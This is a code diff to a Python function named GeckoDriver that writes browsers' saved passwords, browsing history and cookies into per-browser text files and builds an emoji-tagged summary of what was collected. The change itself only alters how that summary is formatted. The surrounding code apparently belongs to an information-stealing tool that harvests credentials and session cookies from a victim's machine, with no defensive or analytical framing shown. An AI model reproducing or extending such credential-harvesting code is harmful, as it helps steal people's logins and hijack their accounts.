@@ -250,16 +250,19 @@ def GeckoDriver(data):
     if browsers_data:
             if not os.path.exists(pathtofile+'\\Browsers\\'):
                 os.mkdir(pathtofile+'\\Browsers\\')
-            
+
             for browser_name in browsers_data:
 
-                data.append("\n"+browser_name)
+                new = True
 
                 if "Saved_Passwords" in browsers_data[browser_name]:
                     if not os.path.exists(pathtofile+'\\Browsers\\'+browser_name):
                         os.mkdir(pathtofile+'\\Browsers\\'+browser_name)
                     with open(f'{pathtofile}\\Browsers\\{browser_name}\\logins.txt', 'w', encoding='UTF-8') as f:
                         f.write(browsers_data[browser_name]['Saved_Passwords'])
+                    if new:
+                        data.append("\n🔍"+browser_name)
+                        new = False
                     data.append("\n∟📜logins")
 
                 if "Browser_History" in browsers_data[browser_name]:
@@ -267,6 +270,9 @@ def GeckoDriver(data):
                         os.mkdir(pathtofile+'\\Browsers\\'+browser_name)
                     with open(f'{pathtofile}\\Browsers\\{browser_name}\\history.txt', 'w', encoding='UTF-8') as f:
                         f.write(browsers_data[browser_name]['Browser_History'])
+                    if new:
+                        data.append("\n🔍"+browser_name)
+                        new = False
                     data.append("\n∟📰history")
               
                 if "Browser_Cookies" in browsers_data[browser_name]:
@@ -274,5 +280,10 @@ def GeckoDriver(data):
                         os.mkdir(pathtofile+'\\Browsers\\'+browser_name)
                     with open(f'{pathtofile}\\Browsers\\{browser_name}\\cookies.txt', 'w', encoding='UTF-8') as f:
                         f.write(browsers_data[browser_name]['Browser_Cookies'])
+                    if new:
+                        data.append("\n🔍"+browser_name)
+                        new = False
                     data.append("\n∟🍪cookies")
+                if not new:
+                    data.append("\n")
     return data
